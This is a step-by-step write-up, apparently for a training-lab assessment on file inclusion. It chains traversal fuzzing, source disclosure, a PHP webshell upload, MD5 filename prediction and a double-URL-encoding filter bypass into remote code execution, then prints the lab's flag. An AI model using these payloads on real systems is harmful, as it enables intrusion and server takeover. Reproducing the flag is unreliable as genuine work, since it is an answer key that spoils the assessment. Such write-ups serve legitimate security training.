# Skills Assessment - File Inclusion
## Questions
1. Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. **Answer:**
   - Notice this API endpoint `api/image.php?p=abc`, try LFI fuzzing on the `p` parameter and notice this endpoint is vulnerable to LFI:
        ```sh
        $ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://154.57.164.69:30165/api/image.php?p=FUZZ -fs 0

                /'___\  /'___\           /'___\       
            /\ \__/ /\ \__/  __  __  /\ \__/       
            \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                \ \_\   \ \_\  \ \____/  \ \_\       
                \/_/    \/_/   \/___/    \/_/       

            v2.1.0-dev
        ________________________________________________

        :: Method           : GET
        :: URL              : http://154.57.164.69:30165/api/image.php?p=FUZZ
        :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
        :: Follow redirects : false
        :: Calibration      : false
        :: Timeout          : 10
        :: Threads          : 40
        :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
        :: Filter           : Response size: 0
        ________________________________________________

        ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 154ms]
        ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 154ms]
        ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 155ms]
        ....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 156ms]
        ....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 156ms]
        ....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 157ms]
        ....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 157ms]
        ....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 157ms]
        ....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 154ms]
        :: Progress: [930/930] :: Job [1/1] :: 257 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
        ```
   - Check if `allow_url_include` is on so we can use RFI techniques or use PHP wrappers to achieve RCE, unfortunately it is turned off:
        ```
        GET /api/image.php?p=....//....//....//....//etc/php/8.2/fpm/php.ini HTTP/1.1
        Host: 154.57.164.69:30165
        ```
        ```
        <SNIP>
        allow_url_include = Off
        <SNIP>
        ```
   - Try to read the source code, from this we know that files are uploaded under `../uploads/ + md5_file($tmp_name) + original extension`:
        ```
        GET /api/image.php?p=....//api/application.php HTTP/1.1
        Host: 154.57.164.69:30165
        ```
        ```
        <?php
        $firstName = $_POST["firstName"];
        $lastName = $_POST["lastName"];
        $email = $_POST["email"];
        $notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

        $tmp_name = $_FILES["file"]["tmp_name"];
        $file_name = $_FILES["file"]["name"];
        $ext = end((explode(".", $file_name)));
        $target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
        move_uploaded_file($tmp_name, $target_file);

        header("Location: /thanks.php?n=" . urlencode($firstName));
        ?>
        ```
   - Read other files, we found another LFI vulnerability which directly returns PHP code:
        ```
        GET /api/image.php?p=....//contact.php HTTP/1.1
        Host: 154.57.164.69:30165
        ```
        ```
        <SNIP>
        <?php
            $region = "AT";
            $danger = false;

            if (isset($_GET["region"])) {
                if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
                    echo "'region' parameter contains invalid character(s)";
                    $danger = true;
                } else {
                    $region = urldecode($_GET["region"]);
                }
            }

            if (!$danger) {
                include "./regions/" . $region . ".php";
            }
        ?>
        <SNIP>
        ```
   - Upload the webshell:
        ```
        POST /api/application.php HTTP/1.1
        Host: 154.57.164.80:30248
        Content-Length: 616
        Cache-Control: max-age=0
        Accept-Language: en-US,en;q=0.9
        Origin: http://154.57.164.80:30248
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryF5VAzcM0W6yiAOhv
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://154.57.164.80:30248/apply.php
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ------WebKitFormBoundaryF5VAzcM0W6yiAOhv
        Content-Disposition: form-data; name="firstName"

        1
        ------WebKitFormBoundaryF5VAzcM0W6yiAOhv
        Content-Disposition: form-data; name="lastName"

        2
        ------WebKitFormBoundaryF5VAzcM0W6yiAOhv
        Content-Disposition: form-data; name="email"

        admin@gmail.com
        ------WebKitFormBoundaryF5VAzcM0W6yiAOhv
        Content-Disposition: form-data; name="file"; filename="shell.php"
        Content-Type: application/x-php

        <?php system($_GET['cmd']); ?>

        ------WebKitFormBoundaryF5VAzcM0W6yiAOhv
        Content-Disposition: form-data; name="notes"

        123
        ------WebKitFormBoundaryF5VAzcM0W6yiAOhv--
        ```
   - Try to exploit the LFI with URL encode, we got the error message stating that the server automatically decode the URL 1 time:
        ```
        GET /contact.php?region=%2e%2e%2findex HTTP/1.1
        Host: 154.57.164.80:30248
        ```
        ```
        <SNIP>
        'region' parameter contains invalid character(s)  
        <SNIP>
        ```
   - Double URL encode to successfully exploit this vulnerability, pre-calculate the filename (MD5 hash of the file's content) and include it via LFI to achieve RCE:
        ```sh
        # Calculate the MD5 of the file's content
        $ md5sum shell.php 
        e88d9c921ac17e074964e2c22d780f03  shell.php
        ```
        ```
        GET /contact.php?region=%25%32%65%25%32%65%25%32%66uploads%25%32%66e88d9c921ac17e074964e2c22d780f03&cmd=ls+/ HTTP/1.1
        
        <SNIP>
        bin
        boot    
        dev
        etc
        flag_09ebca.txt
        home
        lib
        lib64
        media
        mnt
        opt
        proc
        root
        run
        sbin
        srv
        sys
        tmp
        usr
        var
        <SNIP>
        ``` 
        ```
        GET /contact.php?region=%25%32%65%25%32%65%25%32%66uploads%25%32%66e88d9c921ac17e074964e2c22d780f03&cmd=cat+/flag_09ebca.txt HTTP/1.1

        <SNIP>
        eedbb78d4800aa45573840ed6bd2d1e3
        <SNIP>
        ``` 